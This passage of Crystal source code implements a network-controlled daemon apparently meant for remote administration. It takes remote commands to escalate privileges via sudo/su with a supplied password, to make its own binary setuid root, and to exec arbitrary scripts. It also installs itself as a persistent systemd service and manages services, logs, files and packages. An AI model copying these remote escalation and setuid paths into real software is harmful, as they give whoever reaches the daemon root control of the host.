        sleep 1.second
        exit 0
      rescue ex
        client.send(Envelope.new("daemon_reply", req_id, build({"error" => ex.message.to_s})))
      end
    end

    # ── daemon: escalate (restart with elevated privileges) ──────────────

    client.on("daemon_escalate") do |env|
      req_id = env.id
      payload = env.payload
      next unless payload

      method = payload["method"]?.try(&.as_s)
      password = payload["password"]?.try(&.as_s)
      script_path = payload["script"]?.try(&.as_s)

      binary = Process.executable_path
      unless binary
        client.send(Envelope.new("daemon_reply", req_id, build({"error" => "cannot determine executable path"})))
        next
      end

      case method
      when "sudo"
        unless password
          client.send(Envelope.new("daemon_reply", req_id, build({"error" => "missing password"})))
          next
        end

        begin
          client.send(Envelope.new("daemon_reply", req_id, build({"status" => "escalating via sudo"})))
          client.disconnect rescue nil
          sleep 500.milliseconds

          process = Process.new("sudo", ["-S", binary] + ARGV.to_a,
            input: Process::Redirect::Pipe,
            output: Process::Redirect::Inherit,
            error: Process::Redirect::Inherit)
          process.input.print(password + "\n")
          process.input.flush
          process.input.close

          sleep 1.second
          exit 0
        rescue ex
          client.send(Envelope.new("daemon_reply", req_id, build({"error" => "sudo failed: #{ex.message}"})))
        end

      when "su"
        unless password
          client.send(Envelope.new("daemon_reply", req_id, build({"error" => "missing password"})))
          next
        end

        begin
          cmd_str = ([binary] + ARGV.to_a).join(" ")
          client.send(Envelope.new("daemon_reply", req_id, build({"status" => "escalating via su"})))
          client.disconnect rescue nil
          sleep 500.milliseconds

          process = Process.new("su", ["-c", cmd_str],
            input: Process::Redirect::Pipe,
            output: Process::Redirect::Inherit,
            error: Process::Redirect::Inherit)
          process.input.print(password + "\n")
          process.input.flush
          process.input.close

          sleep 1.second
          exit 0
        rescue ex
          client.send(Envelope.new("daemon_reply", req_id, build({"error" => "su failed: #{ex.message}"})))
        end

      when "setuid"
        begin
          File.chmod(binary, File::Permissions.new(0o4755))
          client.send(Envelope.new("daemon_reply", req_id, build({"status" => "setuid set, restarting"})))
          sleep 500.milliseconds
          Process.exec(binary, ARGV)
        rescue ex
          client.send(Envelope.new("daemon_reply", req_id, build({"error" => "setuid failed: #{ex.message}"})))
        end

      when "script"
        unless script_path
          client.send(Envelope.new("daemon_reply", req_id, build({"error" => "missing script path"})))
          next
        end

        begin
          client.send(Envelope.new("daemon_reply", req_id, build({"status" => "escalating via script: #{script_path}"})))
          sleep 500.milliseconds
          Process.exec(script_path, [binary] + ARGV.to_a)
        rescue ex
          client.send(Envelope.new("daemon_reply", req_id, build({"error" => "script exec failed: #{ex.message}"})))
        end

      else
        client.send(Envelope.new("daemon_reply", req_id, build({"error" => "unknown method: #{method}. Use: sudo, su, setuid, script"})))
      end
    end

    # ── systemd service install ──────────────────────────────────────────

    client.on("service_install") do |env|
      req_id = env.id
      payload = env.payload

      binary = Process.executable_path
      unless binary
        client.send(Envelope.new("daemon_reply", req_id, build({"error" => "cannot determine executable path"})))
        next
      end

      svc_name = payload.try(&.["name"]?.try(&.as_s)) || "glob-vm"
      description = payload.try(&.["description"]?.try(&.as_s)) || "红猫 Daemon"
      server_host = payload.try(&.["host"]?.try(&.as_s)) || "127.0.0.1"
      server_port = payload.try(&.["port"]?.try(&.as_s)) || "8081"
      user = payload.try(&.["user"]?.try(&.as_s))
      working_dir = payload.try(&.["working_dir"]?.try(&.as_s)) || File.dirname(binary)

      unit = String.build do |s|
        s << "[Unit]\n"
        s << "Description=#{description}\n"
        s << "After=network-online.target\n"
        s << "Wants=network-online.target\n"
        s << "\n"
        s << "[Service]\n"
        s << "Type=simple\n"
        s << "ExecStart=#{binary}\n"
        s << "WorkingDirectory=#{working_dir}\n"
        s << "Restart=always\n"
        s << "RestartSec=5\n"
        s << "User=#{user}\n" if user
        s << "StandardOutput=journal\n"
        s << "StandardError=journal\n"
        s << "SyslogIdentifier=#{svc_name}\n"
        s << "\n"
        s << "[Install]\n"
        s << "WantedBy=multi-user.target\n"
      end

      unit_path = "/etc/systemd/system/#{svc_name}.service"

      begin
        File.write(unit_path, unit)

        stderr = IO::Memory.new
        status = Process.run("systemctl", ["daemon-reload"],
          output: Process::Redirect::Close, error: stderr)

        unless status.success?
          client.send(Envelope.new("daemon_reply", req_id, build({"error" => "daemon-reload failed: #{stderr.to_s.strip}"})))
          next
        end

        reply_payload = JSON.parse(JSON.build do |json|
          json.object do
            json.field "status", "installed #{unit_path}"
            json.field "unit", unit
            json.field "commands" do
              json.array do
                json.string "systemctl enable #{svc_name}"
                json.string "systemctl start #{svc_name}"
              end
            end
          end
        end)
        client.send(Envelope.new("daemon_reply", req_id, reply_payload))
      rescue ex
        client.send(Envelope.new("daemon_reply", req_id, build({"error" => ex.message.to_s})))
      end
    end

    # ── systemctl: manage systemd services ───────────────────────────────

    client.on("svc_list") do |env|
      req_id = env.id
      filter = env.payload.try(&.["filter"]?.try(&.as_s))

      begin
        args = ["list-units", "--type=service", "--no-pager", "--no-legend"]
        stdout = IO::Memory.new
        Process.run("systemctl", args, output: stdout, error: Process::Redirect::Close)

        payload = JSON.parse(JSON.build do |json|
          json.object do
            json.field "services" do
              json.array do
                stdout.to_s.each_line do |line|
                  fields = line.strip.split(5)
                  next if fields.size < 4
                  name = fields[0].sub(/\.service$/, "")
                  next if filter && !name.downcase.includes?(filter.downcase) && !(fields[4]?.try(&.downcase.includes?(filter.downcase)) || false)
                  json.object do
                    json.field "name", name
                    json.field "load", fields[1]
                    json.field "active", fields[2]
                    json.field "sub", fields[3]
                    json.field "description", fields[4]? || ""
                  end
                end
              end
            end
          end
        end)
        client.send(Envelope.new("svc_reply", req_id, payload))
      rescue ex
        client.send(Envelope.new("svc_reply", req_id, build({"error" => ex.message.to_s})))
      end
    end

    client.on("svc_action") do |env|
      req_id = env.id
      payload = env.payload
      next unless payload

      action = payload["action"]?.try(&.as_s)
      unit = payload["unit"]?.try(&.as_s)
      unless action && unit
        client.send(Envelope.new("svc_reply", req_id, build({"error" => "missing action or unit"})))
        next
      end

      valid_actions = ["start", "stop", "restart", "reload", "enable", "disable", "status"]
      unless valid_actions.includes?(action)
        client.send(Envelope.new("svc_reply", req_id, build({"error" => "invalid action: #{action}"})))
        next
      end

      begin
        stdout = IO::Memory.new
        stderr = IO::Memory.new
        status = Process.run("systemctl", [action, unit],
          output: stdout, error: stderr)

        reply_payload = JSON.parse(JSON.build do |json|
          json.object do
            json.field "action", action
            json.field "unit", unit
            json.field "exit_code", status.exit_code
            json.field "stdout", stdout.to_s
            json.field "stderr", stderr.to_s
          end
        end)
        client.send(Envelope.new("svc_reply", req_id, reply_payload))
      rescue ex
        client.send(Envelope.new("svc_reply", req_id, build({"error" => ex.message.to_s})))
      end
    end

    client.on("svc_status") do |env|
      req_id = env.id
      unit = env.payload.try(&.["unit"]?.try(&.as_s))
      unless unit
        client.send(Envelope.new("svc_reply", req_id, build({"error" => "missing unit"})))
        next
      end

      begin
        stdout = IO::Memory.new
        Process.run("systemctl", ["status", unit, "--no-pager"],
          output: stdout, error: Process::Redirect::Close)

        payload = JSON.parse(JSON.build do |json|
          json.object do
            json.field "unit", unit
            json.field "output", stdout.to_s
          end
        end)
        client.send(Envelope.new("svc_reply", req_id, payload))
      rescue ex
        client.send(Envelope.new("svc_reply", req_id, build({"error" => ex.message.to_s})))
      end
    end

    # ── journal: view system logs ────────────────────────────────────────

    client.on("journal_query") do |env|
      req_id = env.id
      p = env.payload

      args = ["--no-pager", "-n", "100"]

      if p
        if unit = p["unit"]?.try(&.as_s)
          args << "-u" << unit
        end
        if grep = p["grep"]?.try(&.as_s)
          args << "-g" << grep
        end
        if lines = p["lines"]?.try(&.as_i)
          args[2] = lines.to_s
        end
        if priority = p["priority"]?.try(&.as_s)
          args << "-p" << priority
        end
        if since = p["since"]?.try(&.as_s)
          args << "--since" << since
        end
        if boot = p["boot"]?
          args << "-b"
          boot_val = boot.as_s? || boot.as_i?.try(&.to_s)
          args << boot_val if boot_val
        end
      end

      begin
        stdout = IO::Memory.new
        stderr = IO::Memory.new
        status = Process.run("journalctl", args, output: stdout, error: stderr)

        payload = JSON.parse(JSON.build do |json|
          json.object do
            json.field "lines" do
              json.array { stdout.to_s.each_line { |l| json.string l } }
            end
            json.field "error", stderr.to_s.strip unless status.success?
          end
        end)
        client.send(Envelope.new("journal_reply", req_id, payload))
      rescue ex
        client.send(Envelope.new("journal_reply", req_id, build({"error" => ex.message.to_s})))
      end
    end

    # ── find: remote file search ───────────────────────────────────────────

    client.on("find_files") do |env|
      req_id = env.id
      p = env.payload

      find_args = [] of String
      search_path = cwd

      if p
        if path = p["path"]?.try(&.as_s)
          search_path = File.expand_path(path, cwd)
        end
        if maxdepth = p["maxdepth"]?.try(&.as_i)
          find_args << "-maxdepth" << maxdepth.to_s
        end
        if name = p["name"]?.try(&.as_s)
          find_args << "-name" << name
        end
        if type = p["type"]?.try(&.as_s)
          find_args << "-type" << type
        end
        if size = p["size"]?.try(&.as_s)
          find_args << "-size" << size
        end
        if mtime = p["mtime"]?.try(&.as_s)
          find_args << "-mtime" << mtime
        end
      end

      begin
        stdout = IO::Memory.new
        stderr = IO::Memory.new
        status = Process.run("find", [search_path] + find_args, output: stdout, error: stderr)

        payload = JSON.parse(JSON.build do |json|
          json.object do
            json.field "files" do
              json.array do
                stdout.to_s.each_line do |line|
                  l = line.strip
                  json.string l unless l.empty?
                end
              end
            end
            json.field "error", stderr.to_s.strip unless status.success?
          end
        end)
        client.send(Envelope.new("find_reply", req_id, payload))
      rescue ex
        client.send(Envelope.new("find_reply", req_id, build({"error" => ex.message.to_s})))
      end
    end

    # ── pkg: package management ──────────────────────────────────────────

    client.on("pkg_action") do |env|
      req_id = env.id
      p = env.payload
      next unless p

      action = p["action"]?.try(&.as_s)
      package = p["package"]?.try(&.as_s)

      unless action
        client.send(Envelope.new("pkg_reply", req_id, build({"error" => "missing action"})))
        next
      end

      needs_pkg = ["search", "install", "remove", "info"].includes?(action)
      if needs_pkg && (package.nil? || package.not_nil!.empty?)
        client.send(Envelope.new("pkg_reply", req_id, build({"error" => "missing package name for #{action}"})))
        next
      end

      mgr = if File.exists?("/usr/bin/dnf")
        "dnf"
      elsif File.exists?("/usr/bin/apt-get")
        "apt-get"
      elsif File.exists?("/usr/bin/pacman")
        "pacman"
      elsif File.exists?("/usr/bin/zypper")
        "zypper"
      else
        nil
      end

      unless mgr
        client.send(Envelope.new("pkg_reply", req_id, build({"error" => "no supported package manager found"})))
        next
      end

      program = ""
      run_args = [] of String

      case mgr
      when "dnf"
        program = "dnf"
        case action
        when "list"    then run_args = ["list", "installed"]
        when "search"  then run_args = ["search", package.not_nil!]
        when "install" then run_args = ["install", "-y", package.not_nil!]
        when "remove"  then run_args = ["remove", "-y", package.not_nil!]
        when "update"  then run_args = ["check-update"]
        when "upgrade" then run_args = ["upgrade", "-y"]
        when "info"    then run_args = ["info", package.not_nil!]
        end
      when "apt-get"
        case action
        when "list"
          program = "dpkg"
          run_args = ["-l"]
        when "search"
          program = "apt-cache"
          run_args = ["search", package.not_nil!]
        when "install"
          program = "apt-get"
          run_args = ["install", "-y", package.not_nil!]
        when "remove"
          program = "apt-get"
          run_args = ["remove", "-y", package.not_nil!]
        when "update"
          program = "apt-get"
          run_args = ["update"]
        when "upgrade"
          program = "apt-get"
          run_args = ["upgrade", "-y"]
        when "info"
          program = "apt-cache"
          run_args = ["show", package.not_nil!]
        end
      when "pacman"
        program = "pacman"
        case action
        when "list"    then run_args = ["-Q"]
        when "search"  then run_args = ["-Ss", package.not_nil!]
        when "install" then run_args = ["-S", "--noconfirm", package.not_nil!]
        when "remove"  then run_args = ["-R", "--noconfirm", package.not_nil!]
        when "update"  then run_args = ["-Sy"]
        when "upgrade" then run_args = ["-Syu", "--noconfirm"]
        when "info"    then run_args = ["-Qi", package.not_nil!]
        end
      when "zypper"
        program = "zypper"
        case action
        when "list"    then run_args = ["packages", "--installed-only"]
        when "search"  then run_args = ["search", package.not_nil!]
        when "install" then run_args = ["install", "-y", package.not_nil!]
        when "remove"  then run_args = ["remove", "-y", package.not_nil!]
        when "update"  then run_args = ["refresh"]
        when "upgrade" then run_args = ["update", "-y"]
        when "info"    then run_args = ["info", package.not_nil!]
        end
      end

      if program.empty?
        client.send(Envelope.new("pkg_reply", req_id, build({"error" => "unsupported action: #{action}"})))
        next
      end

      begin
        stdout = IO::Memory.new
        stderr = IO::Memory.new
        status = Process.run(program, run_args, output: stdout, error: stderr)

        reply = JSON.parse(JSON.build do |json|
          json.object do
            json.field "manager", mgr
            json.field "action", action
            json.field "stdout", stdout.to_s
            json.field "stderr", stderr.to_s
            json.field "exit_code", status.exit_code
          end
        end)
        client.send(Envelope.new("pkg_reply", req_id, reply))
      rescue ex
        client.send(Envelope.new("pkg_reply", req_id, build({"error" => ex.message.to_s})))
      end
    end
  end

  # Build a simple string-keyed JSON::Any from a hash.
  private def self.build(hash : Hash(String, String)) : JSON::Any
    JSON::Any.new(hash.transform_values { |v| JSON::Any.new(v) })
  end

  # Decode strace -xx output (all bytes shown as \xNN hex escapes).
  def self.unescape_strace(s : String) : Bytes
    io = IO::Memory.new
    i = 0
    while i < s.size
      if s[i] == '\\' && i + 1 < s.size
        case s[i + 1]
        when 'n'  then io.write_byte(0x0A_u8); i += 2
        when 'r'  then io.write_byte(0x0D_u8); i += 2
        when 't'  then io.write_byte(0x09_u8); i += 2
        when 'a'  then io.write_byte(0x07_u8); i += 2
        when 'b'  then io.write_byte(0x08_u8); i += 2
        when 'f'  then io.write_byte(0x0C_u8); i += 2
        when 'v'  then io.write_byte(0x0B_u8); i += 2
        when '\\' then io.write_byte(0x5C_u8); i += 2
        when '"'  then io.write_byte(0x22_u8); i += 2
        when 'x'
          if i + 3 < s.size
            begin
              io.write_byte(s[i + 2, 2].to_i(16).to_u8)
              i += 4
            rescue
              io.write_byte(s[i].ord.to_u8); i += 1
            end
          else
            io.write_byte(s[i].ord.to_u8); i += 1
          end
        else
          if s[i + 1] >= '0' && s[i + 1] <= '7'
            j = i + 1
            oct_end = Math.min(j + 3, s.size)
            while j < oct_end && s[j] >= '0' && s[j] <= '7'
              j += 1
            end
            io.write_byte(s[i + 1, j - i - 1].to_i(8).to_u8)
            i = j
          else
            io.write_byte(s[i].ord.to_u8); i += 1
          end
        end
      else
        io.write_byte(s[i].ord.to_u8)
        i += 1
      end
    end
    io.to_slice.dup
  end
end
